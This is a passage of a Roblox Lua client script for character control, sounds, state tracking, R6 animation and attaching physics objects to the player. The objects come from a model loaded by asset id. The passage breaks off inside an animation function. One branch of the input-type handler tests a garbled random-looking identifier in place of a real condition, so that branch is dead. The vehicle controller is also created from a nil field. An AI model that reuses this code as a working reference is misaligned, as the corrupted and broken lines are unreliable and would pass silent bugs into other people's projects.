			-- This case is for when computerModule is nil because of an error and no suitable control module could
			-- be found.
			return nil, false
		end
	end
	
	-- Choose current Touch control module based on settings (user, dev)
	-- Returns module (possibly nil) and success code to differentiate returning nil due to error vs Scriptable
	function ControlModule:SelectTouchModule()
		if not UserInputService.TouchEnabled then
			return nil, false
		end
		local touchModule
		local DevMovementMode = Players.LocalPlayer.DevTouchMovementMode
		if DevMovementMode == Enum.DevTouchMovementMode.UserChoice then
			touchModule = movementEnumToModuleMap[UserGameSettings.TouchMovementMode]
		elseif DevMovementMode == Enum.DevTouchMovementMode.Scriptable then
			return nil, true
		else
			touchModule = movementEnumToModuleMap[DevMovementMode]
		end
		return touchModule, true
	end
	
	local function calculateRawMoveVector(humanoid, cameraRelativeMoveVector)
		local camera = Workspace.CurrentCamera
		if not camera then
			return cameraRelativeMoveVector
		end
	
		if humanoid:GetState() == Enum.HumanoidStateType.Swimming then
			return camera.CFrame:VectorToWorldSpace(cameraRelativeMoveVector)
		end
	
		local c, s
		local _, _, _, R00, R01, R02, _, _, R12, _, _, R22 = camera.CFrame:GetComponents()
		if R12 < 1 and R12 > -1 then
			-- X and Z components from back vector.
			c = R22
			s = R02
		else
			-- In this case the camera is looking straight up or straight down.
			-- Use X components from right and up vectors.
			c = R00
			s = -R01*math.sign(R12)
		end
		local norm = math.sqrt(c*c + s*s)
		return Vector3.new(
			(c*cameraRelativeMoveVector.x + s*cameraRelativeMoveVector.z)/norm,
			0,
			(c*cameraRelativeMoveVector.z - s*cameraRelativeMoveVector.x)/norm
		)
	end
	
	function ControlModule:OnRenderStepped(dt)
		if self.activeController and self.activeController.enabled and self.humanoid then
			-- Give the controller a chance to adjust its state
			self.activeController:OnRenderStepped(dt)
	
			-- Now retrieve info from the controller
			local moveVector = self.activeController:GetMoveVector()
			local cameraRelative = self.activeController:IsMoveVectorCameraRelative()
	
			local clickToMoveController = self:GetClickToMoveController()
			if self.activeController ~= clickToMoveController then
				if moveVector.magnitude > 0 then
					-- Clean up any developer started MoveTo path
					clickToMoveController:CleanupPath()
				else
					-- Get move vector for developer started MoveTo
					clickToMoveController:OnRenderStepped(dt)
					moveVector = clickToMoveController:GetMoveVector()
					cameraRelative = clickToMoveController:IsMoveVectorCameraRelative()
				end
			end
	
			-- Are we driving a vehicle ?
			local vehicleConsumedInput = false
			if self.vehicleController then
				moveVector, vehicleConsumedInput = self.vehicleController:Update(moveVector, cameraRelative, self.activeControlModule==Gamepad)
			end
	
			-- If not, move the player
			-- Verification of vehicleConsumedInput is commented out to preserve legacy behavior,
			-- in case some game relies on Humanoid.MoveDirection still being set while in a VehicleSeat
			--if not vehicleConsumedInput then
				if cameraRelative then
					moveVector = calculateRawMoveVector(self.humanoid, moveVector)
				end
				self.moveFunction(Players.LocalPlayer, moveVector, false)
			--end
	
			-- And make them jump if needed
			self.humanoid.Jump = self.activeController:GetIsJumping() or (self.touchJumpController and self.touchJumpController:GetIsJumping())
		end
	end
	
	function ControlModule:OnHumanoidSeated(active, currentSeatPart)
		if active then
			if currentSeatPart and currentSeatPart:IsA("VehicleSeat") then
				if not self.vehicleController then
					self.vehicleController = self.vehicleController.new(CONTROL_ACTION_PRIORITY)
				end
				self.vehicleController:Enable(true, currentSeatPart)
			end
		else
			if self.vehicleController then
				self.vehicleController:Enable(false, currentSeatPart)
			end
		end
	end
	
	function ControlModule:OnCharacterAdded(char)
		self.humanoid = char:FindFirstChildOfClass("Humanoid")
		while not self.humanoid do
			char.ChildAdded:wait()
			self.humanoid = char:FindFirstChildOfClass("Humanoid")
		end
	
		if self.touchGui then
			self.touchGui.Enabled = true
		end
	
		if self.humanoidSeatedConn then
			self.humanoidSeatedConn:Disconnect()
			self.humanoidSeatedConn = nil
		end
		self.humanoidSeatedConn = self.humanoid.Seated:Connect(function(active, currentSeatPart)
			self:OnHumanoidSeated(active, currentSeatPart)
		end)
	end
	
	function ControlModule:OnCharacterRemoving(char)
		self.humanoid = nil
	
		if self.touchGui then
			self.touchGui.Enabled = false
		end
	end
	
	-- Helper function to lazily instantiate a controller if it does not yet exist,
	-- disable the active controller if it is different from the on being switched to,
	-- and then enable the requested controller. The argument to this function must be
	-- a reference to one of the control modules, i.e. Keyboard, Gamepad, etc.
	function ControlModule:SwitchToController(controlModule)
		if not controlModule then
			if self.activeController then
				self.activeController:Enable(false)
			end
			self.activeController = nil
			self.activeControlModule = nil
		else
			if not self.controllers[controlModule] then
				self.controllers[controlModule] = controlModule.new(CONTROL_ACTION_PRIORITY)
			end
	
			if self.activeController ~= self.controllers[controlModule] then
				if self.activeController then
					self.activeController:Enable(false)
				end
				self.activeController = self.controllers[controlModule]
				self.activeControlModule = controlModule -- Only used to check if controller switch is necessary
	
				if self.touchControlFrame and (self.activeControlModule == ClickToMove
							or self.activeControlModule == TouchThumbstick
							or self.activeControlModule == DynamicThumbstick) then
					if not self.controllers[TouchJump] then
						self.controllers[TouchJump] = TouchJump.new()
					end
					self.touchJumpController = self.controllers[TouchJump]
					self.touchJumpController:Enable(true, self.touchControlFrame)
				else
					if self.touchJumpController then
						self.touchJumpController:Enable(false)
					end
				end
	
				self:EnableActiveControlModule()
			end
		end
	end
	
	function ControlModule:OnLastInputTypeChanged(newLastInputType)
		if lastInputType == newLastInputType then
			warn("LastInputType Change listener called with current type.")
		end
		lastInputType = newLastInputType
	
		if lastInputType == Enum.UserInputType.Touch then
			-- TODO: Check if touch module already active
			local touchModule, success = self:SelectTouchModule()
			if success then
				while not self.touchControlFrame do
					wait()
				end
				self:SwitchToController(touchModule)
			end
		elseif computerhXwTBw2EjaJJMy9vvYExau1mRNSRiro1H8C ~= nil then
			local computerModule = self:SelectComputerMovementModule()
			if computerModule then
				self:SwitchToController(computerModule)
			end
		end
	end
	
	-- Called when any relevant values of GameSettings or LocalPlayer change, forcing re-evalulation of
	-- current control scheme
	function ControlModule:OnComputerMovementModeChange()
		local controlModule, success =  self:SelectComputerMovementModule()
		if success then
			self:SwitchToController(controlModule)
		end
	end
	
	function ControlModule:OnTouchMovementModeChange()
		local touchModule, success = self:SelectTouchModule()
		if success then
			while not self.touchControlFrame do
				wait()
			end
			self:SwitchToController(touchModule)
		end
	end
	
	function ControlModule:CreateTouchGuiContainer()
		if self.touchGui then self.touchGui:Destroy() end
	
		-- Container for all touch device guis
		self.touchGui = Instance.new("ScreenGui")
		self.touchGui.Name = "TouchGui"
		self.touchGui.ResetOnSpawn = false
		self.touchGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		self.touchGui.Enabled = self.humanoid ~= nil
	
		self.touchControlFrame = Instance.new("Frame")
		self.touchControlFrame.Name = "TouchControlFrame"
		self.touchControlFrame.Size = UDim2.new(1, 0, 1, 0)
		self.touchControlFrame.BackgroundTransparency = 1
		self.touchControlFrame.Parent = self.touchGui
	
		self.touchGui.Parent = self.playerGui
	end
	
	function ControlModule:GetClickToMoveController()
		if not self.controllers[ClickToMove] then
			self.controllers[ClickToMove] = ClickToMove.new(CONTROL_ACTION_PRIORITY)
		end
		return self.controllers[ClickToMove]
	end
	
	function ControlModule:IsJumping()
		if self.activeController then
			return self.activeController:GetIsJumping() or (self.touchJumpController and self.touchJumpController:GetIsJumping())
		end
		return false
	end
	
	return ControlModule.new()
end

function _PlayerModule()
	local PlayerModule = {}
	PlayerModule.__index = PlayerModule
	function PlayerModule.new()
		local self = setmetatable({},PlayerModule)
		self.cameras = _CameraModule()
		self.controls = _ControlModule()
		return self
	end
	function PlayerModule:GetCameras()
		return self.cameras
	end
	function PlayerModule:GetControls()
		return self.controls
	end
	function PlayerModule:GetClickToMoveController()
		return self.controls:GetClickToMoveController()
	end
	return PlayerModule.new()
end

function _sounds()
	
	local SetState = Instance.new("BindableEvent",script)
	
	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	
	local SOUND_DATA = {
		Climbing = {
			SoundId = "rbxasset://sounds/action_footsteps_plastic.mp3",
			Looped = true,
		},
		Died = {
			SoundId = "rbxasset://sounds/uuhhh.mp3",
		},
		FreeFalling = {
			SoundId = "rbxasset://sounds/action_falling.mp3",
			Looped = true,
		},
		GettingUp = {
			SoundId = "rbxasset://sounds/action_get_up.mp3",
		},
		Jumping = {
			SoundId = "rbxasset://sounds/action_jump.mp3",
		},
		Landing = {
			SoundId = "rbxasset://sounds/action_jump_land.mp3",
		},
		Running = {
			SoundId = "rbxasset://sounds/action_footsteps_plastic.mp3",
			Looped = true,
			Pitch = 1.85,
		},
		Splash = {
			SoundId = "rbxasset://sounds/impact_water.mp3",
		},
		Swimming = {
			SoundId = "rbxasset://sounds/action_swim.mp3",
			Looped = true,
			Pitch = 1.6,
		},
	}
	
	 -- wait for the first of the passed signals to fire
	local function waitForFirst(...)
		local shunt = Instance.new("BindableEvent")
		local slots = {...}
	
		local function fire(...)
			for i = 1, #slots do
				slots[i]:Disconnect()
			end
	
			return shunt:Fire(...)
		end
	
		for i = 1, #slots do
			slots[i] = slots[i]:Connect(fire)
		end
	
		return shunt.Event:Wait()
	end
	
	-- map a value from one range to another
	local function map(x, inMin, inMax, outMin, outMax)
		return (x - inMin)*(outMax - outMin)/(inMax - inMin) + outMin
	end
	
	local function playSound(sound)
		sound.TimePosition = 0
		sound.Playing = true
	end
	
	local function stopSound(sound)
		sound.Playing = false
		sound.TimePosition = 0
	end
	
	local function shallowCopy(t)
		local out = {}
		for k, v in pairs(t) do
			out[k] = v
		end
		return out
	end
	
	local function initializeSoundSystem(player, humanoid, rootPart)
		local sounds = {}
	
		-- initialize sounds
		for name, props in pairs(SOUND_DATA) do
			local sound = Instance.new("Sound")
			sound.Name = name
	
			-- set default values
			sound.Archivable = false
			sound.EmitterSize = 5
			sound.MaxDistance = 150
			sound.Volume = 0.65
	
			for propName, propValue in pairs(props) do
				sound[propName] = propValue
			end
	
			sound.Parent = rootPart
			sounds[name] = sound
		end
	
		local playingLoopedSounds = {}
	
		local function stopPlayingLoopedSounds(except)
			for sound in pairs(shallowCopy(playingLoopedSounds)) do
				if sound ~= except then
					sound.Playing = false
					playingLoopedSounds[sound] = nil
				end
			end
		end
	
		-- state transition callbacks
		local stateTransitions = {
			[Enum.HumanoidStateType.FallingDown] = function()
				stopPlayingLoopedSounds()
			end,
	
			[Enum.HumanoidStateType.GettingUp] = function()
				stopPlayingLoopedSounds()
				playSound(sounds.GettingUp)
			end,
	
			[Enum.HumanoidStateType.Jumping] = function()
				stopPlayingLoopedSounds()
				playSound(sounds.Jumping)
			end,
	
			[Enum.HumanoidStateType.Swimming] = function()
				local verticalSpeed = math.abs(rootPart.Velocity.Y)
				if verticalSpeed > 0.1 then
					sounds.Splash.Volume = math.clamp(map(verticalSpeed, 100, 350, 0.28, 1), 0, 1)
					playSound(sounds.Splash)
				end
				stopPlayingLoopedSounds(sounds.Swimming)
				sounds.Swimming.Playing = true
				playingLoopedSounds[sounds.Swimming] = true
			end,
	
			[Enum.HumanoidStateType.Freefall] = function()
				sounds.FreeFalling.Volume = 0
				stopPlayingLoopedSounds(sounds.FreeFalling)
				playingLoopedSounds[sounds.FreeFalling] = true
			end,
	
			[Enum.HumanoidStateType.Landed] = function()
				stopPlayingLoopedSounds()
				local verticalSpeed = math.abs(rootPart.Velocity.Y)
				if verticalSpeed > 75 then
					sounds.Landing.Volume = math.clamp(map(verticalSpeed, 50, 100, 0, 1), 0, 1)
					playSound(sounds.Landing)
				end
			end,
	
			[Enum.HumanoidStateType.Running] = function()
				stopPlayingLoopedSounds(sounds.Running)
				sounds.Running.Playing = true
				playingLoopedSounds[sounds.Running] = true
			end,
	
			[Enum.HumanoidStateType.Climbing] = function()
				local sound = sounds.Climbing
				if math.abs(rootPart.Velocity.Y) > 0.1 then
					sound.Playing = true
					stopPlayingLoopedSounds(sound)
				else
					stopPlayingLoopedSounds()
				end
				playingLoopedSounds[sound] = true
			end,
	
			[Enum.HumanoidStateType.Seated] = function()
				stopPlayingLoopedSounds()
			end,
	
			[Enum.HumanoidStateType.Dead] = function()
				stopPlayingLoopedSounds()
				playSound(sounds.Died)
			end,
		}
	
		-- updaters for looped sounds
		local loopedSoundUpdaters = {
			[sounds.Climbing] = function(dt, sound, vel)
				sound.Playing = vel.Magnitude > 0.1
			end,
	
			[sounds.FreeFalling] = function(dt, sound, vel)
				if vel.Magnitude > 75 then
					sound.Volume = math.clamp(sound.Volume + 0.9*dt, 0, 1)
				else
					sound.Volume = 0
				end
			end,
	
			[sounds.Running] = function(dt, sound, vel)
				sound.Playing = vel.Magnitude > 0.5 and humanoid.MoveDirection.Magnitude > 0.5
			end,
		}
	
		-- state substitutions to avoid duplicating entries in the state table
		local stateRemap = {
			[Enum.HumanoidStateType.RunningNoPhysics] = Enum.HumanoidStateType.Running,
		}
	
		local activeState = stateRemap[humanoid:GetState()] or humanoid:GetState()
		local activeConnections = {}
	
		local stateChangedConn = humanoid.StateChanged:Connect(function(_, state)
			state = stateRemap[state] or state
	
			if state ~= activeState then
				local transitionFunc = stateTransitions[state]
	
				if transitionFunc then
					transitionFunc()
				end
	
				activeState = state
			end
		end)
		
		local customStateChangedConn = SetState.Event:Connect(function(state)
			state = stateRemap[state] or state
	
			if state ~= activeState then
				local transitionFunc = stateTransitions[state]
	
				if transitionFunc then
					transitionFunc()
				end
	
				activeState = state
			end
		end)
	
		local steppedConn = RunService.Stepped:Connect(function(_, worldDt)
			-- update looped sounds on stepped
			for sound in pairs(playingLoopedSounds) do
				local updater = loopedSoundUpdaters[sound]
	
				if updater then
					updater(worldDt, sound, rootPart.Velocity)
				end
			end
		end)
	
		local humanoidAncestryChangedConn
		local rootPartAncestryChangedConn
		local characterAddedConn
	
		local function terminate()
			stateChangedConn:Disconnect()
			customStateChangedConn:Disconnect()
			steppedConn:Disconnect()
			humanoidAncestryChangedConn:Disconnect()
			rootPartAncestryChangedConn:Disconnect()
			characterAddedConn:Disconnect()
		end
	
		humanoidAncestryChangedConn = humanoid.AncestryChanged:Connect(function(_, parent)
			if not parent then
				terminate()
			end
		end)
	
		rootPartAncestryChangedConn = rootPart.AncestryChanged:Connect(function(_, parent)
			if not parent then
				terminate()
			end
		end)
	
		characterAddedConn = player.CharacterAdded:Connect(terminate)
	end
	
	local function playerAdded(player)
		local function characterAdded(character)
			-- Avoiding memory leaks in the face of Character/Humanoid/RootPart lifetime has a few complications:
			-- * character deparenting is a Remove instead of a Destroy, so signals are not cleaned up automatically.
			-- ** must use a waitForFirst on everything and listen for hierarchy changes.
			-- * the character might not be in the dm by the time CharacterAdded fires
			-- ** constantly check consistency with player.Character and abort if CharacterAdded is fired again
			-- * Humanoid may not exist immediately, and by the time it's inserted the character might be deparented.
			-- * RootPart probably won't exist immediately.
			-- ** by the time RootPart is inserted and Humanoid.RootPart is set, the character or the humanoid might be deparented.
	
			if not character.Parent then
				waitForFirst(character.AncestryChanged, player.CharacterAdded)
			end
	
			if player.Character ~= character or not character.Parent then
				return
			end
	
			local humanoid = character:FindFirstChildOfClass("Humanoid")
			while character:IsDescendantOf(game) and not humanoid do
				waitForFirst(character.ChildAdded, character.AncestryChanged, player.CharacterAdded)
				humanoid = character:FindFirstChildOfClass("Humanoid")
			end
	
			if player.Character ~= character or not character:IsDescendantOf(game) then
				return
			end
	
			-- must rely on HumanoidRootPart naming because Humanoid.RootPart does not fire changed signals
			local rootPart = character:FindFirstChild("HumanoidRootPart")
			while character:IsDescendantOf(game) and not rootPart do
				waitForFirst(character.ChildAdded, character.AncestryChanged, humanoid.AncestryChanged, player.CharacterAdded)
				rootPart = character:FindFirstChild("HumanoidRootPart")
			end
	
			if rootPart and humanoid:IsDescendantOf(game) and character:IsDescendantOf(game) and player.Character == character then
				initializeSoundSystem(player, humanoid, rootPart)
			end
		end
	
		if player.Character then
			characterAdded(player.Character)
		end
		player.CharacterAdded:Connect(characterAdded)
	end
	
	Players.PlayerAdded:Connect(playerAdded)
	for _, player in ipairs(Players:GetPlayers()) do
		playerAdded(player)
	end
	return SetState
end

function _StateTracker()
	local EPSILON = 0.1
	
	local SPEED = {
		["onRunning"] = true,
		["onClimbing"] = true 
	}
	
	local INAIR = {
		["onFreeFall"] = true,
		["onJumping"] = true
	}
	
	local STATEMAP = {
		["onRunning"] = Enum.HumanoidStateType.Running,
		["onJumping"] = Enum.HumanoidStateType.Jumping,
		["onFreeFall"] = Enum.HumanoidStateType.Freefall
	}
	
	local StateTracker = {}
	StateTracker.__index = StateTracker
	
	function StateTracker.new(humanoid, soundState)
		local self = setmetatable({}, StateTracker)
		
		self.Humanoid = humanoid
		self.HRP = humanoid.RootPart
		
		self.Speed = 0
		self.State = "onRunning"
		self.Jumped = false
		self.JumpTick = tick()
		
		self.SoundState = soundState
		
		self._ChangedEvent = Instance.new("BindableEvent")
		self.Changed = self._ChangedEvent.Event
		
		return self
	end
	
	function StateTracker:Destroy()
		self._ChangedEvent:Destroy()
	end
	
	function StateTracker:RequestedJump()
		self.Jumped = true
		self.JumpTick = tick()
	end
	
	function StateTracker:OnStep(gravityUp, grounded, isMoving)
		local cVelocity = self.HRP.Velocity
		local gVelocity = cVelocity:Dot(gravityUp)
		
		local oldState, oldSpeed = self.State, self.Speed
		
		local newState
		local newSpeed = cVelocity.Magnitude
	
		if (not grounded) then
			if (gVelocity > 0) then
				if (self.Jumped) then
					newState = "onJumping"
				else
					newState = "onFreeFall"
				end
			else
				if (self.Jumped) then
					self.Jumped = false
				end
				newState = "onFreeFall"
			end
		else
			if (self.Jumped and tick() - self.JumpTick > 0.1) then
				self.Jumped = false
			end
			newSpeed = (cVelocity - gVelocity*gravityUp).Magnitude
			newState = "onRunning"
		end
		
		newSpeed = isMoving and newSpeed or 0
		
		if (oldState ~= newState or (SPEED[newState] and math.abs(oldSpeed - newSpeed) > EPSILON)) then
			self.State = newState
			self.Speed = newSpeed
			self.SoundState:Fire(STATEMAP[newState])
			self._ChangedEvent:Fire(self.State, self.Speed)
		end
	end
	
	return StateTracker
end
function _InitObjects()
	local model = workspace:FindFirstChild("objects") or game:GetObjects("rbxassetid://5045408489")[1]
	local SPHERE = model:WaitForChild("Sphere")
	local FLOOR = model:WaitForChild("Floor")
	local VFORCE = model:WaitForChild("VectorForce")
	local BGYRO = model:WaitForChild("BodyGyro")
	local function initObjects(self)
		local hrp = self.HRP
		local humanoid = self.Humanoid
		local sphere = SPHERE:Clone()
		sphere.Parent = self.Character
		local floor = FLOOR:Clone()
		floor.Parent = self.Character
		local isR15 = (humanoid.RigType == Enum.HumanoidRigType.R15)
		local height = isR15 and (humanoid.HipHeight + 0.05) or 2
		local weld = Instance.new("Weld")
		weld.C0 = CFrame.new(0, -height, 0.1)
		weld.Part0 = hrp
		weld.Part1 = sphere
		weld.Parent = sphere
		local weld2 = Instance.new("Weld")
		weld2.C0 = CFrame.new(0, -(height + 1.5), 0)
		weld2.Part0 = hrp
		weld2.Part1 = floor
		weld2.Parent = floor
		local gyro = BGYRO:Clone()
		gyro.CFrame = hrp.CFrame
		gyro.Parent = hrp
		local vForce = VFORCE:Clone()
		vForce.Attachment0 = isR15 and hrp:WaitForChild("RootRigAttachment") or hrp:WaitForChild("RootAttachment")
		vForce.Parent = hrp
		return sphere, gyro, vForce, floor
	end
	return initObjects
end
local plr = game.Players.LocalPlayer
local ms = plr:GetMouse()
local char
plr.CharacterAdded:Connect(function(c)
	char = c
end)
function _R6()
	function r6()
	local Figure = char
	local Torso = Figure:WaitForChild("Torso")
	local RightShoulder = Torso:WaitForChild("Right Shoulder")
	local LeftShoulder = Torso:WaitForChild("Left Shoulder")
	local RightHip = Torso:WaitForChild("Right Hip")
	local LeftHip = Torso:WaitForChild("Left Hip")
	local Neck = Torso:WaitForChild("Neck")
	local Humanoid = Figure:WaitForChild("Humanoid")
	local pose = "Standing"
	local currentAnim = ""
	local currentAnimInstance = nil
	local currentAnimTrack = nil
	local currentAnimKeyframeHandler = nil
	local currentAnimSpeed = 1.0
	local animTable = {}
	local animNames = { 
		idle = 	{	
					{ id = "http://www.roblox.com/asset/?id=180435571", weight = 9 },
					{ id = "http://www.roblox.com/asset/?id=180435792", weight = 1 }
				},
		walk = 	{ 	
					{ id = "http://www.roblox.com/asset/?id=180426354", weight = 10 } 
				}, 
		run = 	{
					{ id = "run.xml", weight = 10 } 
				}, 
		jump = 	{
					{ id = "http://www.roblox.com/asset/?id=125750702", weight = 10 } 
				}, 
		fall = 	{
					{ id = "http://www.roblox.com/asset/?id=180436148", weight = 10 } 
				}, 
		climb = {
					{ id = "http://www.roblox.com/asset/?id=180436334", weight = 10 } 
				}, 
		sit = 	{
					{ id = "http://www.roblox.com/asset/?id=178130996", weight = 10 } 
				},	
		toolnone = {
					{ id = "http://www.roblox.com/asset/?id=182393478", weight = 10 } 
				},
		toolslash = {
					{ id = "http://www.roblox.com/asset/?id=129967390", weight = 10 } 
	--				{ id = "slash.xml", weight = 10 } 
				},
		toollunge = {
					{ id = "http://www.roblox.com/asset/?id=129967478", weight = 10 } 
				},
		wave = {
					{ id = "http://www.roblox.com/asset/?id=128777973", weight = 10 } 
				},
		point = {
					{ id = "http://www.roblox.com/asset/?id=128853357", weight = 10 } 
				},
		dance1 = {
					{ id = "http://www.roblox.com/asset/?id=182435998", weight = 10 }, 
					{ id = "http://www.roblox.com/asset/?id=182491037", weight = 10 }, 
					{ id = "http://www.roblox.com/asset/?id=182491065", weight = 10 } 
				},
		dance2 = {
					{ id = "http://www.roblox.com/asset/?id=182436842", weight = 10 }, 
					{ id = "http://www.roblox.com/asset/?id=182491248", weight = 10 }, 
					{ id = "http://www.roblox.com/asset/?id=182491277", weight = 10 } 
				},
		dance3 = {
					{ id = "http://www.roblox.com/asset/?id=182436935", weight = 10 }, 
					{ id = "http://www.roblox.com/asset/?id=182491368", weight = 10 }, 
					{ id = "http://www.roblox.com/asset/?id=182491423", weight = 10 } 
				},
		laugh = {
					{ id = "http://www.roblox.com/asset/?id=129423131", weight = 10 } 
				},
		cheer = {
					{ id = "http://www.roblox.com/asset/?id=129423030", weight = 10 } 
				},
	}
	local dances = {"dance1", "dance2", "dance3"}
	-- Existance in this list signifies that it is an emote, the value indicates if it is a looping emote
	local emoteNames = { wave = false, point = false, dance1 = true, dance2 = true, dance3 = true, laugh = false, cheer = false}
	function configureAnimationSet(name, fileList)
		if (animTable[name] ~= nil) then
			for _, connection in pairs(animTable[name].connections) do
				connection:disconnect()
			end
		end
		animTable[name] = {}
		animTable[name].count = 0
		animTable[name].totalWeight = 0	
		animTable[name].connections = {}
		-- check for config values
		local config = script:FindFirstChild(name)
		if (config ~= nil) then
	--		print("Loading anims " .. name)
			table.insert(animTable[name].connections, config.ChildAdded:connect(function(child) configureAnimationSet(name, fileList) end))
			table.insert(animTable[name].connections, config.ChildRemoved:connect(function(child) configureAnimationSet(name, fileList) end))
			local idx = 1
			for _, childPart in pairs(config:GetChildren()) do
				if (childPart:IsA("Animation")) then
					table.insert(animTable[name].connections, childPart.Changed:connect(function(property) configureAnimationSet(name, fileList) end))
					animTable[name][idx] = {}
					animTable[name][idx].anim = childPart
					local weightObject = childPart:FindFirstChild("Weight")
					if (weightObject == nil) then
						animTable[name][idx].weight = 1
					else
						animTable[name][idx].weight = weightObject.Value
					end
					animTable[name].count = animTable[name].count + 1
					animTable[name].totalWeight = animTable[name].totalWeight + animTable[name][idx].weight
		--			print(name .. " [" .. idx .. "] " .. animTable[name][idx].anim.AnimationId .. " (" .. animTable[name][idx].weight .. ")")
					idx = idx + 1
				end
			end
		end
		-- fallback to defaults
		if (animTable[name].count <= 0) then
			for idx, anim in pairs(fileList) do
				animTable[name][idx] = {}
				animTable[name][idx].anim = Instance.new("Animation")
				animTable[name][idx].anim.Name = name
				animTable[name][idx].anim.AnimationId = anim.id
				animTable[name][idx].weight = anim.weight
				animTable[name].count = animTable[name].count + 1
				animTable[name].totalWeight = animTable[name].totalWeight + anim.weight
	--			print(name .. " [" .. idx .. "] " .. anim.id .. " (" .. anim.weight .. ")")
			end
		end
	end
	-- Setup animation objects
	function scriptChildModified(child)
		local fileList = animNames[child.Name]
		if (fileList ~= nil) then
			configureAnimationSet(child.Name, fileList)
		end	
	end
	
	script.ChildAdded:connect(scriptChildModified)
	script.ChildRemoved:connect(scriptChildModified)
	
	
	for name, fileList in pairs(animNames) do 
		configureAnimationSet(name, fileList)
	end	
	
	-- ANIMATION
	
	-- declarations
	local toolAnim = "None"
	local toolAnimTime = 0
	
	local jumpAnimTime = 0
	local jumpAnimDuration = 0.3
	
	local toolTransitionTime = 0.1
	local fallTransitionTime = 0.3
	local jumpMaxLimbVelocity = 0.75
	
	-- functions
	
	function stopAllAnimations()
		local oldAnim = currentAnim
	
		-- return to idle if finishing an emote
		if (emoteNames[oldAnim] ~= nil and emoteNames[oldAnim] == false) then
			oldAnim = "idle"
		end
	
		currentAnim = ""
		currentAnimInstance = nil
		if (currentAnimKeyframeHandler ~= nil) then
			currentAnimKeyframeHandler:disconnect()
		end
	
		if (currentAnimTrack ~= nil) then
			currentAnimTrack:Stop()
			currentAnimTrack:Destroy()
			currentAnimTrack = nil
		end
		return oldAnim
	end
	
	function setAnimationSpeed(speed)
		if speed ~= currentAnimSpeed then
			currentAnimSpeed = speed
			currentAnimTrack:AdjustSpeed(currentAnimSpeed)
		end
	end
	
	function keyFrameReachedFunc(frameName)
		if (frameName == "End") then
	
			local repeatAnim = currentAnim
			-- return to idle if finishing an emote
			if (emoteNames[repeatAnim] ~= nil and emoteNames[repeatAnim] == false) then
				repeatAnim = "idle"
			end
			
			local animSpeed = currentAnimSpeed
			playAnimation(repeatAnim, 0.0, Humanoid)
			setAnimationSpeed(animSpeed)
		end
	end
	
	-- Preload animations
	function playAnimation(animName, transitionTime, humanoid) 
			
		local roll = math.random(1, animTable[animName].totalWeight) 
		local origRoll = roll
		local idx = 1
		while (roll > animTable[animName][idx].weight) do
			roll = roll - animTable[animName][idx].weight
			idx = idx + 1
		end
	--		print(animName .. " " .. idx .. " [" .. origRoll .. "]")
		local anim = animTable[animName][idx].anim
	
		-- switch animation		
		if (anim ~= currentAnimInstance) then
			
			if (currentAnimTrack ~= nil) then
				currentAnimTrack:Stop(transitionTime)
				currentAnimTrack:Destroy()
			end
	
			currentAnimSpeed = 1.0
		
			-- load it to the humanoid; get AnimationTrack
			currentAnimTrack = humanoid:LoadAnimation(anim)
			currentAnimTrack.Priority = Enum.AnimationPriority.Core
			 
			-- play the animation
			currentAnimTrack:Play(transitionTime)
			currentAnim = animName
			currentAnimInstance = anim
	
			-- set up keyframe name triggers
			if (currentAnimKeyframeHandler ~= nil) then
				currentAnimKeyframeHandler:disconnect()
			end
			currentAnimKeyframeHandler = currentAnimTrack.KeyframeReached:connect(keyFrameReachedFunc)
			
		end
	
	end
	
	-------------------------------------------------------------------------------------------
	-------------------------------------------------------------------------------------------
	
	local toolAnimName = ""
	local toolAnimTrack = nil
	local toolAnimInstance = nil
	local currentToolAnimKeyframeHandler = nil
	
	function toolKeyFrameReachedFunc(frameName)
		if (frameName == "End") then
	--		print("Keyframe : ".. frameName)	
			playToolAnimation(toolAnimName, 0.0, Humanoid)
		end
	end
	
	
	function playToolAnimation(animName, transitionTime, humanoid, priority)	 
			
			local roll = math.random(1, animTable[animName].totalWeight) 
			local origRoll = roll
			local idx = 1
			while (roll > animTable[animName][idx].weight) do
				roll = roll - animTable[animName][idx].weight
				idx = idx + 1
			end
	--		print(animName .. " * " .. idx .. " [" .. origRoll .. "]")
			local anim = animTable[animName][idx].anim
	
			if (toolAnimInstance ~= anim) then
				
				if (toolAnimTrack ~= nil) then
					toolAnimTrack:Stop()
					toolAnimTrack:Destroy()
					transitionTime = 0
				end
						
				-- load it to the humanoid; get AnimationTrack
				toolAnimTrack = humanoid:LoadAnimation(anim)
				if priority then
					toolAnimTrack.Priority = priority
				end
				 
				-- play the animation
				toolAnimTrack:Play(transitionTime)
				toolAnimName = animName
				toolAnimInstance = anim
	
				currentToolAnimKeyframeHandler = toolAnimTrack.KeyframeReached:connect(toolKeyFrameReachedFunc)
			end
	end
	
	function stopToolAnimations()
		local oldAnim = toolAnimName
	
		if (currentToolAnimKeyframeHandler ~= nil) then
			currentToolAnimKeyframeHandler:disconnect()
		end
	
		toolAnimName = ""
		toolAnimInstance = nil
		if (toolAnimTrack ~= nil) then
			toolAnimTrack:Stop()
			toolAnimTrack:Destroy()
			toolAnimTrack = nil
		end
	
	
		return oldAnim
	end
	
	-------------------------------------------------------------------------------------------
	-------------------------------------------------------------------------------------------
	
	
	function onRunning(speed)
		if speed > 0.01 then
			playAnimation("walk", 0.1, Humanoid)
			if currentAnimInstance and currentAnimInstance.AnimationId == "http://www.roblox.com/asset/?id=180426354" then
				setAnimationSpeed(speed / 14.5)
			end
			pose = "Running"
		else
			if emoteNames[currentAnim] == nil then
				playAnimation("idle", 0.1, Humanoid)
				pose = "Standing"
			end
		end
	end
	
	function onDied()
		pose = "Dead"
	end
	
	function onJumping()
		playAnimation("jump", 0.1, Humanoid)
		jumpAnimTime = jumpAnimDuration
		pose = "Jumping"
	end
	
	function onClimbing(speed)
		playAnimation("climb", 0.1, Humanoid)
		setAnimationSpeed(speed / 12.0)
		pose = "Climbing"
	end
	
	function onGettingUp()
		pose = "GettingUp"
	end
	
	function onFreeFall()
		if (jumpAnimTime <= 0) then
			playAnimation("fall", fallTransitionTime, Humanoid)
		end
		pose = "FreeFall"
	end
	
	function onFallingDown()
		pose = "FallingDown"
	end
	
	function onSeated()
		pose = "Seated"
	end
	
	function onPlatformStanding()
		pose = "PlatformStanding"
	end
	
	function onSwimming(speed)
		if speed > 0 then
			pose = "Running"
		else
			pose = "Standing"
		end
	end
	
	function getTool()	
		for _, kid in ipairs(Figure:GetChildren()) do
			if kid.className == "Tool" then return kid end
		end
		return nil
	end
	
	function getToolAnim(tool)
